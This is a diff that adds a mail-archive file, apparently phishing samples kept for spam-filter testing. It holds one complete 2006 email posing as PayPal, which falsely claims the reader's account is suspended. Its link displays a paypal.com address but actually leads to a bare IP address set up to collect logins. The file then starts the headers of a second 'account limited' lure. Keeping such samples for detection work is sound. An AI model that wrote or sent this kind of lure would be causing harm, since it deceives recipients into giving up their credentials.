@@ -1,0 +1,71 @@
+From: "PayPal" <service@intl.paypal.com>
+Reply-To: "PayPal" <service@intl.paypal.com>
+To: nobody@example.com
+Subject: Notification of Security Measures
+Date: Mon, 26 Jun 2006 02:57:57 -0400
+X-Mailer: Microsoft Outlook Express 5.00.2919.6700
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--16272020334159982020"
+X-Priority: 1
+X-MSMail-Priority: High
+Status: 
+X-Status: 
+X-Keywords:                   
+
+----16272020334159982020
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<strong>Dear PayPal Member</strong>,<br>
+<br>During our regularly schedule account maintenance and verification we =
+have detected a slight error in your billing information on file with PayP=
+al.<br> This might be due to either following reasons:
+<br>
+<br>- A recent change in your personal information (i.e. change of address=
+)
+<br>- Submitting invalid information during the initial sign up process.
+<br>- An inability to accurately verify your selected option of payment du=
+e an internal error within
+our processors.
+<br>
+<br>Therefore your account has been temporarily suspended. We need you to =
+
+confirm your identity in
+order to regain full privileges of your account.<br><br>
+If this is not completed by <strong>June 28, 2006</strong>, we reserve 
+the right to terminate all privileges of your account
+indefinitly, as it may have been used for fraudulent purposes. We thank 
+you for your cooperation in this manner.<br>
+To confirm your identity please follow the link below:<br>
+<br>
+<a 
+href=3D"http://74.136.116.49:81/.confirm/index.php?MfcISAPICommand=3DSignI=
+nFPP">https://www.paypal.com/cgi-bin/webscr?cmd=3D_login-run</a>
+<br>
+<br>
+<br>
+Thank you for your patience in this matter.
+<br><br>
+PayPal - Customer Service
+<br><br>
+Please do not reply to this e-mail as this is only a notification. Mail 
+sent to this address cannot be answered.
+<br>
+
+----16272020334159982020--
+
+From sandy@63-150-92-250.dia.cust.qwest.net  Mon Jun 26 06:46:32 2006
+Return-Path: <sandy@63-150-92-250.dia.cust.qwest.net>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+	by funky.example.com (Postfix) with ESMTP id 561B746956
+	for <nobody@login.example.com>; Mon, 26 Jun 2006 06:46:32 -0400 (EDT)
+Received: from 63-150-92-250.dia.cust.qwest.net (63-150-92-208.dia.static.qwest.net [63.150.92.208])
+	by mail2.example.com (Postfix) with ESMTP id 0B9186FA3A1
+	for <nobody@example.com>; Mon, 26 Jun 2006 06:46:34 -0400 (EDT)
+Received: by 63-150-92-250.dia.cust.qwest.net (Postfix, from userid 1031)
+	id 40668C4124; Mon, 26 Jun 2006 06:07:09 -0400 (EDT)
+To: nobody@example.com
+Subject: Action Required - Your Account Has Been Limited !
